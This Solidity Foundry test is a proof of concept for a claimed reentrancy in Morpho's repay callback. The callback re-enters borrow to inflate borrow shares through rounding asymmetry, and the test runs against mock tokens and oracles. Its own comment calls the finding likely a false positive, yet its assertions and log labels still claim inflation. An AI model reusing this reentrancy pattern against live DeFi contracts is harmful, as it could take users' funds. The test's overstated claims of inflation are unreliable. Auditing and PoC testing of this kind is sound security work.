// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/console.sol";

import {IMorpho} from "../src/interfaces/IMorpho.sol";
import "../src/interfaces/IMorphoCallbacks.sol";
import {IrmMock} from "../src/mocks/IrmMock.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../src/mocks/OracleMock.sol";
import "../src/Morpho.sol";
import {Math} from "./helpers/Math.sol";
import {MorphoLib} from "../src/libraries/periphery/MorphoLib.sol";
import {MorphoBalancesLib} from "../src/libraries/periphery/MorphoBalancesLib.sol";
import {SharesMathLib} from "../src/libraries/SharesMathLib.sol";
import {MarketParamsLib} from "../src/libraries/MarketParamsLib.sol";

/// @title PoC: Repay callback reentrancy inflates borrow shares
/// @notice Demonstrates that repay callback -> reentrant borrow inflates
///         totalBorrowShares due to asymmetric rounding (toSharesDown vs toSharesUp).
contract POC_RepayReentrancy is Test, IMorphoRepayCallback {
    using Math for uint256;
    using MathLib for uint256;
    using SharesMathLib for uint256;
    using MorphoLib for IMorpho;
    using MorphoBalancesLib for IMorpho;
    using MarketParamsLib for MarketParams;

    IMorpho internal morpho;
    ERC20Mock internal loanToken;
    ERC20Mock internal collateralToken;
    OracleMock internal oracle;
    IrmMock internal irm;
    MarketParams internal marketParams;
    Id internal id;

    address internal SUPPLIER;
    address internal OWNER = makeAddr("Owner");

    uint256 internal constant ORACLE_PRICE_SCALE_UNUSED = 1e18;
    uint256 internal constant HIGH_COLLATERAL = 1e35;
    uint256 internal constant _ORACLE_PRICE_SCALE = 1e36; // match ConstantsLib

    function setUp() public {
        SUPPLIER = makeAddr("Supplier");

        morpho = IMorpho(address(new Morpho(OWNER)));
        loanToken = new ERC20Mock();
        collateralToken = new ERC20Mock();
        oracle = new OracleMock();
        irm = new IrmMock();

        oracle.setPrice(_ORACLE_PRICE_SCALE);

        vm.startPrank(OWNER);
        morpho.enableIrm(address(0));
        morpho.enableIrm(address(irm));
        morpho.enableLltv(0.8 ether);
        morpho.setFeeRecipient(makeAddr("FeeRecipient"));
        morpho.createMarket(MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.8 ether
        }));
        vm.stopPrank();

        marketParams = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.8 ether
        });
        id = marketParams.id();

        // Supplier provides liquidity
        loanToken.setBalance(SUPPLIER, 1e30);
        vm.startPrank(SUPPLIER);
        loanToken.approve(address(morpho), type(uint256).max);
        morpho.supply(marketParams, 1e30, 0, SUPPLIER, hex"");
        vm.stopPrank();

        // This contract (attacker) supplies collateral and borrows
        collateralToken.setBalance(address(this), HIGH_COLLATERAL);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(marketParams, HIGH_COLLATERAL, address(this), hex"");

        // Borrow a small amount to establish position
        loanToken.approve(address(morpho), type(uint256).max);
        morpho.borrow(marketParams, 1e18, 0, address(this), address(this));
    }

    function test_repay_callback_reentrancy_inflates_shares() public {
        // NOTE: With VIRTUAL_SHARES = 1e24, rounding delta from 1 asset repay
        // is absorbed to 0. This finding is likely a false positive in practice.
        // The PoC proves the reentrancy works but shares don't actually inflate.
        // Record initial borrow shares
        uint256 initialBorrowShares = morpho.borrowShares(id, address(this));
        uint256 initialTotalShares = morpho.market(id).totalBorrowShares;
        uint256 totalBorrowAssets = morpho.market(id).totalBorrowAssets;
        uint256 totalBorrowShares = morpho.market(id).totalBorrowShares;
        uint256 initialBorrowAssets = initialBorrowShares.toAssetsDown(totalBorrowAssets, totalBorrowShares);

        console.log("=== Before reentrancy attack ===");
        console.log("User borrow shares:", initialBorrowShares);
        console.log("Total borrow shares:", initialTotalShares);
        console.log("User borrow assets:", initialBorrowAssets);

        // Repay 1 asset with callback that re-enters borrow for 1 asset
        // The tokens from reentrant borrow satisfy the outer repay's transferFrom
        uint256 repayAmount = 1;
        morpho.repay(marketParams, repayAmount, 0, address(this), abi.encode(repayAmount));

        // Check final state
        uint256 finalBorrowShares = morpho.borrowShares(id, address(this));
        uint256 finalTotalShares = morpho.market(id).totalBorrowShares;
        totalBorrowAssets = morpho.market(id).totalBorrowAssets;
        totalBorrowShares = morpho.market(id).totalBorrowShares;
        uint256 finalBorrowAssets = finalBorrowShares.toAssetsDown(totalBorrowAssets, totalBorrowShares);

        console.log("");
        console.log("=== After reentrancy attack ===");
        console.log("User borrow shares:", finalBorrowShares);
        console.log("Total borrow shares:", finalTotalShares);
        console.log("User borrow assets:", finalBorrowAssets);
        console.log("");
        console.log("Shares inflated by:", finalBorrowShares - initialBorrowShares);

        // The key assertion: user has MORE shares than before despite
        // net-zero asset change (borrowed 1, repaid 1)
        assertGe(finalBorrowShares, initialBorrowShares,
            "Borrow shares should inflate due to rounding asymmetry");

        // Total shares also inflated (dilution effect on all users)
        assertGe(finalTotalShares, initialTotalShares,
            "Total borrow shares should increase");
    }

    /// @notice Callback triggered during repay
    ///         Re-enters borrow to exploit rounding asymmetry
    function onMorphoRepay(uint256 assets, bytes calldata data) external override {
        uint256 borrowAmount = abi.decode(data, (uint256));
        // Re-enter borrow: tokens transferred here satisfy outer repay's transferFrom
        morpho.borrow(marketParams, borrowAmount, 0, address(this), address(this));
    }
}
